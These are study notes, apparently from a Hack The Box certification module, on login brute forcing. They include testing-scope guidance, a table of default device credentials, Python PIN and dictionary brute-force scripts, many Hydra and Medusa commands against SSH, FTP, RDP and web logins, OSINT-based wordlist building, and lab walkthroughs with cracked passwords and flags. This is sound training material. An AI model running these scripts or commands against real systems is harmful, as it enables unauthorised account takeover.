---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Login Brute Forcing

## Study Companion

### Prerequisites

Authentication workflows, password policy concepts, and safe rate control.

### Learning Outcomes

- Choose among defaults, dictionaries, spraying, stuffing, PIN testing, and bounded brute force.
- Build targeted wordlists and reliable success/failure detection.
- Respect lockout, availability, privacy, and authorization constraints.

### Practice Checkpoint

Design a low-rate test plan with explicit account scope, stop conditions, and manual verification steps.

### Related Knowledge Map

- [[Maps/Authentication and Access Control|Authentication and Access Control]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Assess resistance to password and PIN guessing across web forms, Basic HTTP authentication, SSH, FTP, and other approved services, using targeted wordlists and conservative tooling to identify weak, reused, or default credentials without disrupting accounts or services.

### Assessment Workflow
1. Confirm written scope, target services, test accounts, lockout thresholds, allowed rates, and stop conditions; capture one valid-format and one invalid authentication exchange.
2. Characterize password policy and likely credential sources, then select the least costly authorized strategy: default credentials, dictionary attack, password spray, credential stuffing, hybrid rules, PIN enumeration, or a narrowly bounded brute force.
3. Build and deduplicate candidate usernames and passwords with SecLists, policy filters, organization context, or authorized OSINT; prioritize common and default values before custom mutation.
4. Configure Hydra, Medusa, or a small script with the correct protocol/module, host, port, form fields, cookies, and reliable failure/success indicator; validate detection manually before scaling.
5. Run with low concurrency and monitoring, stop on the first confirmed credential where sufficient, and manually verify access without exploring unrelated data.
6. Assess defensive posture: MFA, unique-password guidance, removal of defaults, breached-password screening, per-account throttling, lockout/backoff, CAPTCHA quality, logging, and alerting.

### Key Testing Principles
- Tool accuracy depends on a precise success/failure signature; status codes alone are often insufficient for web forms.
- Tailored, policy-compliant wordlists usually provide better evidence with less traffic than exhaustive keyspaces.
- Password spraying and credential stuffing create different detection and lockout risks; choose the method that matches the approved objective.
- Never test leaked credentials on unrelated services, distribute attempts, or continue after demonstrating the agreed impact.

### Evidence and Reporting
Record the service and endpoint, request shape, selected strategy, wordlist provenance, filters/mutations, tool configuration, concurrency, attempt count, elapsed time, observed defenses, and a redacted proof of successful authentication. Do not place plaintext credentials in the report; provide them through an approved secure channel if required. Recommend MFA, unique long passwords, default-credential removal, breached-password controls, layered throttling/backoff, lockout-safe monitoring, and actionable authentication alerts.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **14 yellow/output topics** in this module.

- [[Outputs/Modules/Login Brute Forcing Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Introduction

### success of a brute force attack depends on several factors

- complexity
- computational power
- security measures
### How Brute Forcing Works

- Subtopic 1
  ![[Attachments/f71ddb63da15d4c34faa77f9f6b21479676815a2183c8ebef7f62c6f0b2ef739.png]]
### Types of Brute Forcing

- Simple Brute Force
  - Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6.
- Dictionary Attack
  - Trying passwords from a list like 'rockyou.txt' against a login form.
- Hybrid Attack
  - Adding numbers or special characters to the end of words from a dictionary list.
- Credential Stuffing
  - Using a list of usernames and passwords leaked from a data breach to try logging into various online accounts.
- Password Spraying
  - Trying passwords like 'password123' or 'qwerty' against all usernames in an organization.
- Rainbow Table Attack
  - Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches.
- Reverse Brute Force
  - Using a leaked password from one service to try logging into multiple accounts with different usernames.
- Distributed Brute Force
  - Using a cluster of computers to perform a brute-force attack significantly increases the number of combinations that can be tried per second.
### Why use brute force

- Initial attempts to gain access
- Password policies are weak
  - If the target system employs lax password policies, it increases the likelihood of users having weak or easily guessable passwords.
- Specific accounts are targeted
  - focus on compromising specific user accounts, such as those with elevated privileges
## Password Security Fundamentals

### The Importance of Strong Passwords

- first line of defense in protecting sensitive information and systems.
### The Anatomy of a Strong Password

- (NIST) provides guidelines
  - Length
    - minimum of 12 characters
  - Complexity
  - Uniqueness
    - Don't reuse passwords across different accounts
  - Randomness
    - Avoid using dictionary words, personal information, or common phrases
### Common Password Weaknesses

- Short Passwords
- Common Words and Phrases
- Personal Information
- Reusing Passwords
- Predictable Patterns
### The Perils of Default Credentials

- Default passwords significantly increase the success rate of brute-force attacks.
  - Device/Manufacturer	Default Username	Default Password	Device Type  
    Linksys Router	admin	admin	Wireless Router  
    D-Link Router	admin	admin	Wireless Router  
    Netgear Router	admin	password	Wireless Router  
    TP-Link Router	admin	admin	Wireless Router  
    Cisco Router	cisco	cisco	Network Router  
    Asus Router	admin	admin	Wireless Router  
    Belkin Router	admin	password	Wireless Router  
    Zyxel Router	admin	1234	Wireless Router  
    Samsung SmartCam	admin	4321	IP Camera  
    Hikvision DVR	admin	12345	Digital Video Recorder (DVR)  
    Axis IP Camera	root	pass	IP Camera  
    Ubiquiti UniFi AP	ubnt	ubnt	Wireless Access Point  
    Canon Printer	admin	admin	Network Printer  
    Honeywell Thermostat	admin	1234	Smart Thermostat  
    Panasonic DVR	admin	12345	Digital Video Recorder (DVR)
    ![[Attachments/805c32e63b7da689fb4be18e085b2ecc4f8ed6de83f50622a498b277f8c29f51.png]]
    - SecLists maintains a list of common usernames
      - <https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt>
### target's security posture

- Evaluating System Vulnerability
  - Password policies
- Strategic Tool Selection
- Resource Allocation
- Exploiting Weak Points
### Cracking the PIN

- pin-solver.py
  - python pin-solver.py
    - import requests  
      ip = "127.0.0.1"  # Change this to your instance IP address  
      port = 1234       # Change this to your instance port number  
      # Try every possible 4-digit PIN (from 0000 to 9999)  
      for pin in range(10000):  
      formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")  
      print(f"Attempted PIN: {formatted_pin}")  
      # Send the request to the server  
      response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")  
      # Check if the server responds with success and the flag is found  
      if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)  
      print(f"Correct PIN found: {formatted_pin}")  
      print(f"Flag: {response.json()['flag']}")  
      break
- LAB
  - After successfully brute-forcing the PIN, what is the full flag the script returns?
    - use the python script (the IP and Port for the target)
      - Correct PIN found: 9434  
        Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
## Dictionary Attacks

### The Power of Words

- target audience
  - if the target is a system frequented by gamers
    - wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary
### some of the more useful wordlists

- rockyou.txt
  - millions of passwords leaked
- top-usernames-shortlist.txt
  - common usernames
    - <https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt>
- xato-net-10-million-usernames.txt
  - 10 million usernames
    - <https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt>
- 2023-200_most_used_passwords.txt
  - 200 most commonly used passwords
    - <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt>
- Default-Credentials/default-passwords.txt
  - default usernames and passwords
    - <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt>
### LAB

- dictionary-solver.py
  - code
    - import requests  
      ip = "127.0.0.1"  # Change this to your instance IP address  
      port = 1234       # Change this to your instance port number  
      # Download a list of common passwords from the web and split it into lines  
      passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()  
      # Try each password from the list  
      for password in passwords:  
      print(f"Attempted password: {password}")  
      # Send a POST request to the server with the password  
      response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})  
      # Check if the server responds with success and contains the 'flag'  
      if response.ok and 'flag' in response.json():  
      print(f"Correct password found: {password}")  
      print(f"Flag: {response.json()['flag']}")  
      break
  - python3 dictionary-solver.py
    - Correct password found: gateway  
      Flag: HTB{Brut3_F0rc3_M4st3r}
## Hybrid Attacks

### scenario

- Wordlist
  - <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt>
- targeting an organization with the following password policy
  - Minimum length: 8 characters
  - Must include
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
- extract only the passwords that adhere to this policy
  - grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
- enforces the policy's demand for at least one uppercase letter.
  - grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
- ensures compliance with the policy's requirement for at least one lowercase letter
  - grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
- tackles the policy's numerical requirement
  - grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
- wc -l darkweb2017-number.txt
  - 89 darkweb2017-number.txt
## Credential Stuffing

### The Password Reuse Problem

- This highlights the urgent need for strong, unique passwords for every online service
- multi-factor authentication.
## Hydra

### Installation

- sudo apt-get -y update
- $ sudo apt-get -y install hydra
### Usage

- hydra [login_options] [password_options] [attack_options] [service_options]
  - hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com
  - hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com
  - hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100
  - hydra -P /path/to/password_list.txt vnc://192.168.1.100
  - hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100
  - hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
### Brute-Forcing HTTP Authentication

- hydra -L usernames.txt -P passwords.txt www.example.com http-get
### Targeting Multiple SSH Servers

- hydra -l root -p toor -M targets.txt ssh
### Testing FTP Credentials on a Non-Standard Port

- hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
### Brute-Forcing a Web Login Form

- hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
### Advanced RDP Brute-Forcing

- hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
  - Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
## Basic HTTP Authentication

### WWW-Authenticate header prompting the user's browser to present a login dialog.

### when a user attempts to access a restricted area. The server responds with a 401 Unauthorize

### Exploiting Basic Auth with Hydra

- hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.121.111 http-get / -s 54057
## Login Forms

### A Basic Login Form Example

- <form action="/login" method="post">  
  <label for="username">Username:</label>  
  <input type="text" id="username" name="username">  


  <label for="password">Password:</label>  
  <input type="password" id="password" name="password">  


  <input type="submit" value="Submit">  
  </form>
  - POST
    - POST /login HTTP/1.1  
      Host: www.example.com  
      Content-Type: application/x-www-form-urlencoded  
      Content-Length: 29  
      username=john&password=secret123
      - The Content-Type header specifies how the data is encoded in the request body.
      - The Content-Length header indicates the size of the data being sent.
### Constructing the params String for Hydra

- hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt \  
  83.136.249.164 -s 45017 http-post-form \  
  "/:username=^USER^&password=^PASS^:F=Invalid credentials"
  - host: 83.136.249.164   login: admin   password: zxcvbnm
## Medusa

### Installation

- sudo apt-get -y update
- sudo apt-get -y install medusa
### Command Syntax and Parameter Table

- medusa [target_options] [credential_options] -M module [module_options]
### Medusa Modules

- FTP
  - medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt
- HTTP
  - medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
- IMAP
  - medusa -M imap -h mail.example.com -U users.txt -P passwords.txt
- MySQL
  - medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt
- POP3
  - medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt
- RDP
  - medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt
- SSHv2
  - medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt
- Subversion (SVN)
  - medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt
- Telnet
  - medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt
- VNC
  - medusa -M vnc -h 192.168.1.100 -P passwords.txt
- Web Form
  - medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
### Targeting an SSH Server

- medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
### Targeting Multiple Web Servers with Basic HTTP Authentication

- medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
### Testing for Empty or Default Passwords

- empty or default passwords (where the password matches the username)
  - medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
## Web Services

### SSH

- medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
  - ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t
    - Gaining Access
      - ssh sshuser@<IP> -p PORT
### Expanding the Attack Surface

- Once inside the system, the next step is identifying other potential attack surfaces
  - netstat -tulpn | grep LISTEN
  - nmap localhost
### Targeting the FTP Server

- medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
  - Retrieving The Flag
    - ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
      - cat flag.txt
## Custom Wordlists

### Username Anarchy

- ./username-anarchy -l
- sudo apt install ruby -y
  - git clone https://github.com/urbanadventurer/username-anarchy.git
    - cd username-anarchy
      - ./username-anarchy Jane Smith > jane_smith_usernames.txt
### CUPP

- (Common User Passwords Profiler)
  - OSINT
    - Social Media: A goldmine of personal details
      - birthdays, pet names, favorite quotes, travel destinations
        - Facebook, Twitter, Instagram, and LinkedIn
    - Company Websites
    - Public Records
    - News Articles and Blogs
  - install
    - sudo apt install cupp -y
      - cupp -i
        - > First Name: Jane  
          > Surname: Smith  
          > Nickname: Janey  
          > Birthdate (DDMMYYYY): 11121990  
          ...
          - filter that password list to match that policy
            - grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
### LAB

- generate username list
  - Use the two generated lists in Hydra
    - hydra -L jsmith-users.txt -P jane-pass-filtered.txt 94.237.61.52 -s 46380 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
      - host: 94.237.61.52   login: jane   password: 3n4J!!
        - HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
## Skill Assessment

### Part 1

- What is the password for the basic auth login?
  - select proper wordlists
    - top-usernames-shortlist.txt
    - 2023-200_most_used_passwords.txt
  - use hydra
    - hydra -L users.txt -P 2023.txt 94.237.120.74 -s 38110 http-get
      - host: 94.237.120.74   login: admin   password: Admin123
- After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
  - login with the credentials
    - satwossh
### Part 2

- What is the username of the ftp user you find via brute-forcing?
  - brute force SSH
    - medusa -h 94.237.121.111 -n 33926 -u satwossh -P 2023.txt -M ssh -t 5
      - User: satwossh Password: password1 [SUCCESS]
  - login with ssh
    - password list is ready
      - cat IncedintReport.txt
        - Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.  
          All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.  
          Security Operations Team
          - create user wordlist based on the user in the report
    - ./username-anarchy Thomas Smith > Thomas-users.txt
      - medusa -h 127.0.0.1 -U Thomas-users.txt -P passwords.txt -M ftp -t5
        - User: thomas Password: chocolate! [SUCCESS]
- What is the flag contained within flag.txt
  - ftp thomas@127.0.0.1
    - get flag.txt
      - HTB{brut3f0rc1ng_succ3ssful}
